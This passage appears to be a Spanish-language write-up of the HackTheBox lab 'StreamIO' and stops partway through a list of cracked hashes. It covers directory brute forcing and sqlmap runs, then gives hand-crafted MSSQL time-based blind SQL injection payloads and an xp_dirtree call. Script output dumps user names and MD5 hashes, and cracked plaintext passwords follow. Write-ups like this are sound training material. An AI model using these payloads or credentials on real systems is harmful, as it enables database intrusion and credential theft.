https://streamio.htb/About.php 200 GET 395l 915w 13497c https://streamio.htb/Index.php 200 GET 111l 269w 4145c https://streamio.htb/Login.php 301 GET 2l 10w 147c https://streamio.htb/js =\u0026gt; https://streamio.htb/js/ 302 GET 0l 0w 0c https://streamio.htb/logout.php =\u0026gt; https://streamio.htb/ 200 GET 121l 291w 4500c https://streamio.htb/Register.php 301 GET 2l 10w 150c https://streamio.htb/fonts =\u0026gt; https://streamio.htb/fonts/ 301 GET 2l 10w 151c https://streamio.htb/IMAGES =\u0026gt; https://streamio.htb/IMAGES/ 200 GET 395l 915w 13497c https://streamio.htb/INDEX.php 301 GET 2l 10w 150c https://streamio.htb/Fonts =\u0026gt; https://streamio.htb/Fonts/ 301 GET 2l 10w 150c https://streamio.htb/Admin =\u0026gt; https://streamio.htb/Admin/ 301 GET 2l 10w 148c https://streamio.htb/CSS =\u0026gt; https://streamio.htb/CSS/ 301 GET 2l 10w 147c https://streamio.htb/JS =\u0026gt; https://streamio.htb/JS/ 302 GET 0l 0w 0c https://streamio.htb/Logout.php =\u0026gt; https://streamio.htb/ 200 GET 206l 430w 6434c https://streamio.htb/CONTACT.php 200 GET 231l 571w 7825c https://streamio.htb/ABOUT.php Registramos un usuario en /register.php.\nAl intentar ingresar por el login nos muestra Login failed, parece ser que el registro no se ralizó correctamente.\nLa dirección /admin/ solo muestra el mensaje forbidden.\n1 2 3 π ~/htb/streamio ❯ curl -sk https://streamio.htb/admin/ \u0026lt;h1\u0026gt;FORBIDDEN\u0026lt;/h1\u0026gt; π ~/htb/streamio ❯ watch.streamio.htb El subdominio muestra información sobre actualizaciones de nuevas peliculas, se muestra un formulario de correo electronico.\nDirectory Brute Forcing feroxbuster muestra search y blocked.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 π ~/htb/streamio ❯ feroxbuster -k -u https://watch.streamio.htb/ -w $MD --depth 1 -x asp,aspx,html,php ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.5.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ https://watch.streamio.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.5.0 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [asp, aspx, html, php] 🏁 HTTP methods │ [GET] 🔓 Insecure │ true 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 200 GET 78l 245w 2829c https://watch.streamio.htb/index.php 301 GET 2l 10w 157c https://watch.streamio.htb/static =\u0026gt; https://watch.streamio.htb/static/ 200 GET 0l 0w 253887c https://watch.streamio.htb/search.php 200 GET 7193l 19558w 253887c https://watch.streamio.htb/Search.php 200 GET 78l 245w 2829c https://watch.streamio.htb/Index.php 200 GET 78l 245w 2829c https://watch.streamio.htb/INDEX.php 200 GET 20l 47w 677c https://watch.streamio.htb/blocked.php 200 GET 7193l 19558w 253887c https://watch.streamio.htb/SEARCH.php 301 GET 2l 10w 157c https://watch.streamio.htb/Static =\u0026gt; https://watch.streamio.htb/Static/ /search.php solo muestra una larga lista de peliculas.\nblocked.phpmuestra un mensaje de bloqueo.\nIntentamos verificar que en search no existiera algun tipo de vulnerabilidad sql, al intentar con diferentes \u0026ldquo;payloads\u0026rdquo; nos redirige a blocked. Al ejecutar sqlmap este muestra boolean-based blind pero no logra detectar la base de datos por lo que no logra obtener información. Manualmente no obtuvimos información, por lo que intentamos en otro lugar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 π ~/htb/streamio/sqlmap ❯ ./sqlmap.py -u \u0026#34;https://watch.streamio.htb/search.php\u0026#34; --data \u0026#34;q=god\u0026#34; --dbs --batch --risk 3 --level 5 [.. snip ..] [21:24:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: q (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: q=a%\u0026#39; AND 4271=4271 AND \u0026#39;jtID%\u0026#39;=\u0026#39;jtID --- [21:24:02] [INFO] testing MySQL [21:24:02] [WARNING] the back-end DBMS is not MySQL [.. snip ..] [21:24:02] [INFO] testing Virtuoso [21:24:02] [WARNING] the back-end DBMS is not Virtuoso [21:24:02] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system SQLi Time-Based + Blind Utilizamos sqlmap esta vez en el login del dominio, observamos que se detectó el tipo \u0026lsquo;stacked queries\u0026rsquo; pero segun el payload se podría decir que es un Time-based, se muestran 5 bases de datos, además se muestra que la base de datos es MSSQL.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 π ~/htb/streamio/sqlmap ❯ ./sqlmap.py -u \u0026#34;https://streamio.htb/login.php\u0026#34; --data \u0026#34;username=user\u0026amp;password=pass\u0026#34; -p username,password --dbs --batch --level 5 --risk 3 ___ __H__ ___ ___[)]_____ ___ ___ {1.6.6.12#dev} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 21:46:57 /2022-07-04/ [21:46:57] [INFO] testing connection to the target URL you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=h6qt79i9ta3...teto4ni9b9\u0026#39;). Do you want to use those [Y/n] Y [21:46:57] [INFO] checking if the target is protected by some kind of WAF/IPS [21:46:58] [INFO] testing if the target URL content is stable [21:46:58] [INFO] target URL content is stable [21:46:59] [WARNING] heuristic (basic) test shows that POST parameter \u0026#39;username\u0026#39; might not be injectable [21:46:59] [INFO] testing for SQL injection on POST parameter \u0026#39;username\u0026#39; [21:46:59] [INFO] testing \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; [21:47:23] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause\u0026#39; [21:48:05] [INFO] testing \u0026#39;OR boolean-based blind - WHERE or HAVING clause (NOT)\u0026#39; [.. snip ..] [22:16:45] [INFO] checking if the injection point on POST parameter \u0026#39;username\u0026#39; is a false positive POST parameter \u0026#39;username\u0026#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N sqlmap identified the following injection point(s) with a total of 3936 HTTP(s) requests: --- Parameter: username (POST) Type: stacked queries Title: Microsoft SQL Server/Sybase stacked queries (comment) Payload: username=user\u0026#39;;WAITFOR DELAY \u0026#39;0:0:5\u0026#39;--\u0026amp;password=pass --- [22:17:45] [INFO] testing Microsoft SQL Server [22:17:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y [22:17:51] [INFO] confirming Microsoft SQL Server [22:17:56] [INFO] the back-end DBMS is Microsoft SQL Server web server operating system: Windows 2019 or 2016 or 10 web application technology: PHP 7.2.26, Microsoft IIS 10.0, PHP back-end DBMS: Microsoft SQL Server 2019 [.. snip ..] [20:21:14] [WARNING] in case of continuous data retrieval problems you are advised to try a switch \u0026#39;--no-cast\u0026#39; or switch \u0026#39;--hex\u0026#39; available databases [5]: [*] model [*] msdb [*] STREAMIO [*] streamio_backup [*] tempdb Enumeramos la base de datos STREAMIO tablas y columnas. Se muestra la tabla users, con la columna passwords y username como las más \u0026lsquo;relevantes\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Database: STREAMIO [2 tables] +--------+ | movies | | users | +--------+ Database: STREAMIO Table: users [4 columns] +----------+-------+ | Column | Type | +----------+-------+ | id | int | | is_staff | bit | | password | nchar | | username | nchar | +----------+-------+ Intentamos realizar un dump a la tabla de users pero el proceso es MUY lento y la información que presenta es incompleta o no se comprende del todo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Database: STREAMIO Table: users [7 entries] +----------+---------------------------------------------------------------+-------------------------------------------------------------+ | is_staff | password | username | +----------+---------------------------------------------------------------+-------------------------------------------------------------+ | 1 | c660060492d9edcaa8332d89c99c9239 | Jam\\x81s | | 1\\x02 | 925e5408ecb67aea449373d668b7359e | Theodore \\x81 | | 1 | 083ffae904143ca_\\x818|464dӏù4@ܓ\\x83h7d~ð Ǹ\\x88 ½ t؃ | Saωant\\x88a ɡ | | 1 | 08344b85b329d7efd611b7a7743e8a09 | Lauren | | 1 | d62be0dc82071bccc1322d64ec5b6c51 \\x81 | William | | 1 | f87d3c0d6c8fd686aacc6627f1f493a5 | Sabrina | | 1 | f03b910e2bd0313a23fdd7575f34a694 | Robert ¦࠿ ؠ߅\\x1d\\x19 | +----------+---------------------------------------------------------------+-------------------------------------------------------------+ SQL - Payloads Creamos un script el cual realiza una enumeración (base de datos, tablas, columnas) y obtiene todos los datos de la tabla dada. Utilizamos distintas funciones y la condición IF junto con WAITFOR DELAY, se muestra el payload \u0026ldquo;principal\u0026rdquo;.\n1 IF(/*\u0026lt;boolean\u0026gt;*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- stream.py - StreamIO Se muestra un poco más de información sobre el script en el \u0026ldquo;Expand me\u0026rdquo;.\nExpand me\rEn el siguiente ejemplo se obtiene el valor del primer caracter de @@version, como podemos observar su valor es \u0026lsquo;M\u0026rsquo;, utilizando ord() con python obtenemos su representación unicode, para este, seria 77 el cual validamos y comparamos dentro de la condicion IF con UNICODE, y como sabemos esto es correcto, por lo que estaría haciendo una pausa de 5 segundos. Realizamos esto utilizando una iteración por casi todos los valores unicode, para cada caracter del dato que obtenemos, hasta obtener el valor completo tomando en cuenta la pausa que se realiza, de no haber pausa el valor unicode no es el correcto. Tambien hacemos uso de ISNULL().\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /* # From python \u0026gt;\u0026gt;\u0026gt; ord(\u0026#34;M\u0026#34;) 77 \u0026gt;\u0026gt;\u0026gt; */ /* # From MSSQL 1\u0026gt; select @@version 2\u0026gt; go Microsoft SQL Server 2022 (CTP2.0) - 16.0.600.9 (X64) May 20 2022 13:29:42 Copyright (C) 2022 Microsoft Corporation Developer Edition (64-bit) on Linux (Ubuntu 20.04.4 LTS) \u0026lt;X64\u0026gt; (1 rows affected) */ /* Query/payload */ IF( UNICODE( SUBSTRING( CAST( @@version as VARCHAR(20) ) ), 1,1)=77 ) WAITFOR DELAY \u0026#39;0:0:5\u0026#39;-- Se muestran los diferentes queries utilizados para obtener información de la base de datos. Se Realiza un conteo del numero de bases de datos y filas existentes, numero utilizado para realizar una iteración.\n1 2 3 4 5 /* count dbs*/ IF(ISNULL(UNICODE(SUBSTRING(CAST(((SELECT CAST(COUNT(*) as varchar (10)) FROM master..sysdatabases)) AS varchar(100)), /*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- /* count rows */ USE /*dbname*/;IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT CAST(COUNT(*) as varchar (10)) FROM /*table*/)) AS varchar(100)), /*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- Obtiene el nombre de base de datos.\n1 2 /* get dbs */ IF(ISNULL(UNICODE(SUBSTRING(CAST((SELECT LOWER(db_name(/*0..n*/)) )AS varchar(8000)),/*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- Para obtener los nombres de tablas y columnas utilizamos STRING_AGG(), esta función nos devuelve una string con todos los nombres de tablas o columnas separadas cada una por comma, por lo que sería un texto muy largo.\n1 2 3 4 5 /* get tables */ USE /*dbname*/;IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(name,\u0026#39;N/A\u0026#39;)), \u0026#39;,\u0026#39;) FROM sys.tables )) AS varchar(800)),/*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- /* get columns*/ USE /*dbname*/;IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(column_name,\u0026#39;N/A\u0026#39;)), \u0026#39;,\u0026#39;) FROM information_schema.columns WHERE table_name =\u0026#39;/*table*/\u0026#39; )) AS varchar(800)),/*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- Para realizar un \u0026ldquo;dump\u0026rdquo; de las tablas encontramos dos payloads/queries el primero hace uso de STRING_AGG(), por lo que obtendríamos una string super larga (de existir mil filas en x tabla, obtendriamos las mil separadas por comma) ya que no existe LIMIT en SQL Server.\n1 2 /* dump v1 */ USE /*dbname*/;IF(ISNULL(UNICODE(SUBSTRING(CAST((( SELECT STRING_AGG(CONVERT(NVARCHAR(max), ISNULL(LOWER(REPLACE(/*column*/, \u0026#39; \u0026#39;,\u0026#39;\u0026#39;)),\u0026#39;N/A\u0026#39;)), \u0026#39;,\u0026#39;) FROM /*table*/ )) AS varchar(800)),/*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- Luego de revisar la documentación de microsoft, encontramos OFSET FETCH con lo cual logramos obtener el valor por fila y no todas las filas a la vez.\n1 2 /* dump v2 */ USE /*dbname*/;IF(ISNULL(UNICODE(SUBSTRING(CAST((SELECT /*column*/ FROM /*dbname*/.dbo./*table*/ ORDER BY id OFFSET /*0..n*/ ROWS FETCH NEXT 1 ROWS ONLY) AS varchar(100)),/*0..n*/,1)),0)=/*ord(letter)*/) WAITFOR DELAY \u0026#39;0:0:1\u0026#39;-- Durante el proceso logramos identificar que es posible ejecutar xp_dirtree.\n1 2 /* exec */ EXEC master.dbo.xp_dirtree \u0026#39;\\\\\\\\10.10.10.10\\\\not_a_share\u0026#39; WAITFOR DELAY \u0026#39;0:0:4\u0026#39;-- Ref.\nRun SQL Server Linux container images with Docker Queries MSSQL Blind Based MSSQL Practical Injection Blind SQL Injection Detection and Exploitation SQL Server (sqlcmd) HackTheBox - Spider by Lanzt MSSQL Enumeration Enumeramos las bases de datos observamos 6, a diferencia de sqlmap que muestra unicamente 5.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/streamio ❯ python3 stream.py --dbs __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Fetching number of Databases: 6 found. [+] Fetching Databases (1): master [+] Fetching Databases (2): tempdb [+] Fetching Databases (3): model [+] Fetching Databases (4): msdb [+] Fetching Databases (5): streamio [+] Fetching Databases (6): streamio_backup π ~/htb/streamio ❯ Enumeramos las tablas de la base de datos streamio, vemos movies y users.\n1 2 3 4 5 6 7 8 9 π ~/htb/streamio ❯ python3 stream.py -d streamio --tables __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Fetching tables in \u0026#39;streamio\u0026#39;: [+] movies [+] users π ~/htb/streamio ❯ Observamos que la tabla movies tiene algunas columnas que se asimilan a la información encontrada en /search.php.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/streamio ❯ python3 stream.py -d streamio -t movies --columns __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Fetching columns of movies in \u0026#39;streamio\u0026#39;: [+] id [+] movie [+] year [+] imdb [+] metascore [+] votes π ~/htb/streamio ❯ En la tabla users encontramos columnas con posibles credenciales.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/streamio ❯ python3 stream.py -d streamio -t users --columns __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Fetching columns of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39;: [+] id [+] username [+] password [+] is_staff π ~/htb/streamio ❯ Dump - Users Logramos dumpear la tabla users observamos 31 filas o nombres de usuarios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 π ~/htb/streamio ❯ python3 stream.py __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Number of rows in \u0026#39;users\u0026#39; DB \u0026#39;streamio\u0026#39;: 30 entries in users found. [*] 31 entries found on users. [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (1): James ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (2): Theodore ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (3): Samantha ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (4): Lauren ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (5): Wildiam ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (6): Sabrina ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (7): Robert ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (8): Thane ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (9): Carmon ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (10): Barry ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (11): Oliver ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (12): Michelle ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (13): Gloria ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (14): Victoria ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (15): Alexendra ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (16): Baxter ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (17): Clara ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (18): Barbra ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (19): Lenord ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (20): Austin ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (21): Garfield ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (22): Juliette ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (23): Victor ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (24): Lucifer ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (25): Bruno ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (26): Diablo ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (27): Robin ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (28): Stan ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (29): yoshihide ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (30): admin ✓ [+] Dump data in \u0026#39;username\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (31): gato ✓ De igual forma para la columna password, en este caso observamos 33 filas o hashes MD5.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 π ~/htb/streamio ❯ python3 stream.py -d streamio -t users -c password -hex __ ___ __ ___ __ /__` | |__) |__ /\\ |\\/| | / \\ .__/ | | \\ |___ /~~\\ | | | \\__/ Time-based Blind SQL Injection on StreamIO · sckull [+] Number of rows in \u0026#39;users\u0026#39; DB \u0026#39;streamio\u0026#39;: 33 entries found. [*] 33 entries found on users. [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (1): c660060492d9edcaa8332d89c99c9239 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (2): 925e5408ecb67aea449373d668b7359e ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (3): 083ffae904143c4796e464dac33c1f7d ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (4): 08344b85b329d7efd611b7a7743e8a09 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (5): d62be0dc82071bccc1322d64ec5b6c51 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (6): f87d3c0d6c8fd686aacc6627f1f493a5 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (7): f03b910e2bd0313a23fdd7575f34a694 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (8): 3577c47eb1e12c8ba021611e1280753c ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (9): 35394484d89fcfdb3c5e447fe749d213 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (10): 54c88b2dbd7b1a84012fabc1a4c73415 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (11): fd78db29173a5cf701bd69027cb9bf6b ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (12): b83439b16f844bd6ffe35c02fe21b3c0 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (13): 0cfaaaafb559f081df2befbe66686de0 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (14): b22abb47a02b52d5dfa27fb0b534f693 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (15): 1c2b3d8270321140e5153f6637d3ee53 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (16): 22ee218331afd081b0dcd8115284bae3 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (17): ef8f3d30a856cf166fb8215aca93e9ff ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (18): 3961548825e3e21df5646cafe11c6c76 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (19): ee0b8a09372b160b2882ea3b2f8dc49f ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (20): 0049ac57646627b8d7aeaccf8b6a936f ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (21): 8097cedd612cc37c29db152b6e9edbd3 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (22): 6dcd87740abb64edfa36d170f0d5450d ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (23): bf55e15b119860a6e6b5a164377da719 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (24): 7df45a9e3de3863807c026ba48e55fb3 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (25): 2a4e2cf22dd8fcb45adcb91be1e22ae8 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (26): ec33265e5fc8c2f1b0c137bb7b3632b5 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (27): dc332fb5576e9631c9dae83f194f8e70 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (28): 384463526d288edcc95fc3701e523bc7 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (29): b779ba15cedfd22a023c4d8bcf5f2332 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (30): 665a50ac9eaa781e4f7f04199db97a11 ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (31): cce4dc8008d7cf2c8aef5a7c82ac6e8d ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (32): d41b81798500b204e9800998ecf8427e ✓ [+] Dump data in \u0026#39;password\u0026#39; of \u0026#39;users\u0026#39; in \u0026#39;streamio\u0026#39; row (33): d41d8cd98f003004e9800998ecf8427e ✓ π ~/htb/streamio ❯ Online Password Hash Crack Utilizando crackstation y md5decrypt logramos identificar y obtener el valor de 13 hashes.\nCrackStation Output\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 c660060492d9edcaa8332d89c99c9239: -- 925e5408ecb67aea449373d668b7359e : L3m0n@de 083ffae904143c4796e464dac33c1f7d: -- 08344b85b329d7efd611b7a7743e8a09: ##123a8j8w5123## d62be0dc82071bccc1322d64ec5b6c51: -- f87d3c0d6c8fd686aacc6627f1f493a5: !!sabrina$ f03b910e2bd0313a23fdd7575f34a694: -- 3577c47eb1e12c8ba021611e1280753c: highschoolmusical 35394484d89fcfdb3c5e447fe749d213: -- 54c88b2dbd7b1a84012fabc1a4c73415: $hadoW fd78db29173a5cf701bd69027cb9bf6b: -- b83439b16f844bd6ffe35c02fe21b3c0: !?Love?!123 0cfaaaafb559f081df2befbe66686de0: -- b22abb47a02b52d5dfa27fb0b534f693: !5psycho8! 1c2b3d8270321140e5153f6637d3ee53: -- 22ee218331afd081b0dcd8115284bae3: -- ef8f3d30a856cf166fb8215aca93e9ff: %$clara 3961548825e3e21df5646cafe11c6c76: -- ee0b8a09372b160b2882ea3b2f8dc49f: -- 0049ac57646627b8d7aeaccf8b6a936f: -- 8097cedd612cc37c29db152b6e9edbd3: -- 6dcd87740abb64edfa36d170f0d5450d: $3xybitch bf55e15b119860a6e6b5a164377da719: -- 7df45a9e3de3863807c026ba48e55fb3: -- 2a4e2cf22dd8fcb45adcb91be1e22ae8: $monique$1991$ ec33265e5fc8c2f1b0c137bb7b3632b5: -- dc332fb5576e9631c9dae83f194f8e70: -- 384463526d288edcc95fc3701e523bc7: -- b779ba15cedfd22a023c4d8bcf5f2332: 